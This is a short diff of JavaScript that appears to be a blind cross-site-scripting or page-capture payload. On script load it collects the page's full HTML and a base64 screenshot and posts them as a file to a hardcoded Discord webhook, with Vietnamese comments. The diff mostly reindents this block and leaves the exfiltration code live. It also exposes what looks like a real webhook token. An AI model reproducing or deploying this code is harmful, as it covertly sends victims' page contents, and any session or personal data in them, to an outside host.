@@ -62,22 +62,24 @@ script.onload = function() {
         msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
         msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
 
-var discordWebhook = "https://discordapp.com/api/webhooks/1286611999404589106/pt9S7Jjzx49Mk_YdPPyHn_2KPz0dFz-y1XIugJgbB34W5SRvkKUhAtRBkWGfffuWIf5m";
-
-// Tạo file Blob từ nội dung
-var blob = new Blob([msg], { type: "text/plain" });
-var formData = new FormData();
-formData.append("file", blob, "message.txt");
-
-// Gửi POST request
-fetch(discordWebhook, {
-    method: "POST",
-    body: formData
-}).then(response => {
-    if(response.ok) {
-        console.log("Gửi file thành công!");
-    } else {
-        console.error("Lỗi khi gửi file", response.statusText);
-    }
-});
+        var discordWebhook = "https://discordapp.com/api/webhooks/1286611999404589106/pt9S7Jjzx49Mk_YdPPyHn_2KPz0dFz-y1XIugJgbB34W5SRvkKUhAtRBkWGfffuWIf5m";
+        
+        // Tạo file Blob từ nội dung
+        var blob = new Blob([msg], { type: "text/plain" });
+        var formData = new FormData();
+        formData.append("file", blob, "message.txt");
+        
+        // Gửi POST request
+        fetch(discordWebhook, {
+            method: "POST",
+            body: formData
+        }).then(response => {
+            if(response.ok) {
+                console.log("Gửi file thành công!");
+            } else {
+                console.error("Lỗi khi gửi file", response.statusText);
+            }
+        });
         loadingOverlay.style.display = 'none';
+    });
+};
